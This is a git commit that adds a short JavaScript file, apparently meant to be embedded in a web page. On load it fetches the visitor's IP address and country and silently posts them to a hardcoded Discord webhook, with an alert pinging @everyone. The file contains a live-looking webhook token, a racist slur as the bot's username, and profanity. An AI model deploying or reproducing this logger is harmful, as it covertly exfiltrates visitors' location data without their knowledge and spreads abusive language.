68e66030443183e0406ecfb4919cedb63ef909aa
szefitekSK <112479082+szefitekSK@users.noreply.github.com>
2022-08-30 14:15:19 +0200

    Add files via upload
    ghhhhhgf

---
+++ javascript.js
@@ -0,0 +1,36 @@
+var webHookUrl = "https://discordapp.com/api/webhooks/1014145672993321051/wF_pT5JZse6MQ2dCmMI3OJjKieWsh00at_WX5u1BNALQnSZaDfyiJBqTncIAOsoME3t1";
+
+$.getJSON('https://api.db-ip.com/v2/free/self', function(data) {
+  console.log(JSON.stringify(data, null, 2));
+});
+
+const request = async () => { // Calling a "synchronous" fetch
+    const response = await fetch('https://api.db-ip.com/v2/free/self');
+    const data = await response.json();
+    console.log(data);
+
+    // Declaring variables
+    var ip = data.ipAddress;
+    var country = data.countryName;
+
+    // Open POST Request
+    var postRequest = new XMLHttpRequest();
+    postRequest.open("POST", webHookUrl);
+
+    postRequest.setRequestHeader('Content-type', 'application/json');
+
+    var params = {
+        username:   "czarnuch nyger",
+        avatar_url: "",
+        content:    "**NOWA KURWA IP BOMBA** @everyone \n" + 
+		    "__**:globe_with_meridians: IP Address:**__ \n" +
+                    "`" + ip + "` \n \n" +
+		    "__**Country:**__ \n" +
+		    "`" + country + "`"
+    }
+
+    postRequest.send(JSON.stringify(params));
+
+}
+
+request();
